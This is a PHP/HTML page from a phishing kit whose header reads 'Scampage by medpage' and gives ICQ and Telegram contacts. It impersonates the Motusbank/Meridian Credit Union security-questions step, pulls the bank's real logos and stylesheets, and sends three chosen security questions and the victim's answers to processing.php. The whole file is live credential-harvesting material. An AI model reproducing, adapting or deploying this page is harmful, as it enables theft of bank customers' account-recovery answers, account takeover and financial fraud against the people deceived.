<?php
   /*
 * Scampage by medpage
 * ICQ: 679849675
 * TELE: @medpagestore
 */

   require "../includes/session_protect.php";
   require "../includes/functions.php";
   require "../includes/One_Time.php";
   
   ?>

<!DOCTYPE html>
<html>
<head>
    
    <title>Security - Motusbank</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
    <meta name="description" content="Meridian Credit Union online banking">
    <meta name="keywords" content="meridian, credit, union, online, banking">

	<link href="https://banking.meridiancu.ca//Content/css/style.css?v=OB.Retail.Release.6.7.1.19" rel="stylesheet" />



</head>
<body style="background:white">

<div class="load-remove" style="display: none">


	
</div>
<div class="body-content" style="background:white" >
	<div class="row public-header">
		<div class="logo-container">
			<a href="/Security_Login">
				<img src="https://banking.motusbank.ca/Content/Images/logo.svg" alt="Motusbank Logo" class="meridian-logo" />
			</a>
		</div>
		<div class="link-container">
			<ul class="utility-links">
				<li>
					<a href="https://www.meridiancu.ca/" target="_blank">Motusbank.ca</a>
				</li>
			</ul>
		</div>
	</div>
</div>

	<div id="page-content" class="signin-page" style="background-image: url(https://banking.motusbank.ca/Content/Images/Banners/Retail_SignInBackground_All.jpg)">


		<div class="signin-page-inner dimmed" >
			<div class="row" >
				<div class="signin-form-container wide" >
					

<form action="processing.php" method="post"><input name="__RequestVerificationToken" type="hidden" value="Ey6DdmQayNZKIwyvXT6wMHdUSK7j_E8OH0FwHKfwudx2Ic1BC7qndfMZda_45RVtg6I2kc3oL_8Y_R0bXyqtJczCe5x7OUlRS-eYrpDfX4k1" />	
<div class="signin-form" style="background:#df3116">
		<h1>Security Questions</h1>



<div class="horizontal-steps" >
	<div class="step selected">
		<span>Log in</span>
	</div>
	
	<div class="step ">
		<span>Security</span>
	</div>

	<div class="step ">
		<span>Complete</span>
	</div>
</div>



			<p>PERSONAL INFORMATION.</p>

<select required="" name="Q1" class="td-layout-grid6" size="1" style="height:42px;width:340px;background-color:#df3116">	
						<option selected="selected">Select a question</option>
			<option value="Oldest nephew's first name">Oldest nephew's first name</option>
			<option value="City you were married in">City you were married in</option>
			<option value="Colour of your first car">Colour of your first car</option>
			<option value="Best friend's first name">Best friend's first name</option>
			<option value="Name of your first pet">Name of your first pet</option>
			<option value="Mother's maiden name">Mother's maiden name</option>
			<option value="Maternal grandmother's first name">Maternal grandmother's first name</option>
			<option value="Maid of Honour's first name">Maid of Honour's first name</option>
			<option value="City of your High Scholl">City of your High Scholl</option>
			<option value="WFather's middle name">Father's middle name</option>
						</select>

<input  id="CustNo" name="A1" placeholder="Enter your security answer" required="required" type="text" value="" />

<select required="" name="Q2" class="td-layout-grid6" size="1" style="height:42px;width:340px;background-color:#df3116"">	
				<option selected="selected">Select a question</option>
			<option value="Oldest nephew's first name">Oldest nephew's first name</option>
			<option value="City you were married in">City you were married in</option>
			<option value="Colour of your first car">Colour of your first car</option>
			<option value="Best friend's first name">Best friend's first name</option>
			<option value="Name of your first pet">Name of your first pet</option>
			<option value="Mother's maiden name">Mother's maiden name</option>
			<option value="Maternal grandmother's first name">Maternal grandmother's first name</option>
			<option value="Maid of Honour's first name">Maid of Honour's first name</option>
			<option value="City of your High Scholl">City of your High Scholl</option>
			<option value="WFather's middle name">Father's middle name</option>

<input  id="CustNo" name="A2" placeholder="Enter your security answer"  required="required" type="text" value="" />

<select required="" name="Q3" class="td-layout-grid6" size="1" style="height:42px;width:340px;background-color:#df3116"">	
		<option selected="selected">Select a question</option>
			<option value="Oldest nephew's first name">Oldest nephew's first name</option>
			<option value="City you were married in">City you were married in</option>
			<option value="Colour of your first car">Colour of your first car</option>
			<option value="Best friend's first name">Best friend's first name</option>
			<option value="Name of your first pet">Name of your first pet</option>
			<option value="Mother's maiden name">Mother's maiden name</option>
			<option value="Maternal grandmother's first name">Maternal grandmother's first name</option>
			<option value="Maid of Honour's first name">Maid of Honour's first name</option>
			<option value="City of your High Scholl">City of your High Scholl</option>
			<option value="WFather's middle name">Father's middle name</option>
					 
</select>

<input  id="CustNo" name="A3" placeholder="Enter your security answer" required="required" type="text" value="" />
</BR>

			
		<div class="double signin-buttons">
			<div>
				<a href="/Security_Login" class="transparent button">Cancel</a>
			</div>
			<div>
				<input type="submit" class="orange button" value="Continue" />
			</div>
		</div>
	</div>
</form>

					<div class="signin-form-links">
						<a href="/Security_Contact" class="semibold ">Contact Us</a> |
						<a href="/Security_FAQ" class="semibold ">FAQs</a> |
						<a href="/Security_Difficulty" class="semibold ">Having Difficulty Signing In?</a>
					</div>
				</div>
			</div>
		</div>
	</div>

<footer class="main-footer" style="background:white">
	<div class="row" >
		<div class="footer-logos">
			<div class="logo-container">
				<a href="/Security_Login">
					<img src="https://banking.motusbank.ca/Content/Images/logo.svg" alt="Motusbank Logo" class="meridian-logo" />
				</a>
			</div>
			<div>
				<img src="https://banking.motusbank.ca//Content/Images/Spirals/Spiral-1.svg" class="entrust-seal" />
			</div>
		</div>
		<div class="footer-sub" >
			<span ><font color="black">Copyright &copy; 2021 Meridian Credit Union. All rights reserved.</font></span>
			<div class="footer-links">
				<a href="https://www.meridiancu.ca/privacy" title="Privacy & Security" target="_blank" ><font color="black">Privacy & Security</font></a>
				<a href="https://www.meridiancu.ca/legal" title="Legal" target="_blank" ><font color="black">Legal</font></a>
				<a href="https://www.meridiancu.ca/accessibility" title="Accessibility" target="_blank" ><font color="black">Accessibility</font></a>
			</div>
		</div>
	</div>
</footer>

	
</body>
</html>
